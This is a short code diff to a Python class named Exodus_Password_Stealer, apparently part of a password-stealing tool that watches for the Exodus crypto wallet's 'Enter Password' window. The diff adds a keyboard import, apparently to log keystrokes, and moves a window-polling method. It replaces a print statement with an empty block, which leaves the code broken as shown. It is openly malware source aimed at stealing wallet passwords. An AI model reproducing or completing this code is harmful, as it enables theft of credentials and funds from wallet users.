@@ -1,4 +1,5 @@
 import time
+import keyboard
 
 from typing import Union
 from modules.tasks import Tasks
@@ -8,6 +9,9 @@ class Exodus_Password_Stealer:
     def __init__(self, exectuable_name: str) -> None:
         self.executable_name: str = exectuable_name
         
+    def current_active_window(self) -> dict[str]:
+        return Current_Window.fetch_one()
+        
     def check_if_running(self) -> Union[str, bool]:
         is_running_result: any = Tasks.is_running(executable_name=self.executable_name)
         
@@ -15,9 +19,6 @@ class Exodus_Password_Stealer:
             return is_running_result
         else:
             return None   
-        
-    def current_active_window(self) -> dict[str]:
-        return Current_Window.fetch_one()
     
     def start_listener(self):
         while True:
@@ -25,7 +26,7 @@ class Exodus_Password_Stealer:
                 current_active_window: dict[str] = self.current_active_window()
                 
                 if current_active_window["title"] == "Enter Password":
-                    print("exodus login screen is open")
+                    
                 
                 time.sleep(0.2)
         
